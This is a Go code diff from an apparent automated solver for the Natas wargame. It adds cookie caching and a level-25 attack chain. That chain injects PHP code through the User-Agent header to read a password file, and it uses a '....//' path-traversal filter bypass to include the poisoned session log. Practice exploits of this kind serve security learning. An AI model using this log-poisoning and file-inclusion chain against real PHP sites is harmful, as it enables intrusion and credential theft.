@@ -231,13 +231,21 @@ type Cookie struct {
 	Name string
 }
 
+var lastCookieURL, lastCookieName, lastCookieValue string
+
 func (c Cookie) Grab(r http.Request) string {
+	if r.URL.String() == lastCookieURL && c.Name == lastCookieName {
+		return lastCookieValue
+	}
+	lastCookieURL = r.URL.String()
+	lastCookieName = c.Name
 	r.Method = http.MethodHead
 	resp, err := http.DefaultClient.Do(&r)
 	e(err)
 	cookies := resp.Cookies()
 	for _, cookie := range cookies {
 		if cookie.Name == c.Name {
+			lastCookieValue = cookie.Value
 			return cookie.Value
 		}
 	}
@@ -700,6 +708,34 @@ var levels = [...]Grabber{
 			32,
 		},
 		SetData{"passwd[]": Text{}},
+	},
+	//level 25
+	Headers{
+		Prefixed{
+			Get{
+				Headers{
+					grab,
+					SetData{"User-Agent": Text{"<?php echo \"Password: \";include(\"/etc/natas_webpass/natas26\"); ?>"}},
+				},
+				SetData{
+					"lang": Combine{
+						Combine{
+							Text{"....//....//....//....//....//var/www/natas/natas25/logs/natas25_"},
+							Cookie{"PHPSESSID"},
+						},
+						Text{".log"},
+					},
+				},
+			},
+			"Password: ",
+			32,
+		},
+		SetData{
+			"Cookie": Combine{
+				Text{"PHPSESSID="},
+				Cookie{"PHPSESSID"},
+			},
+		},
 	},
 }
 
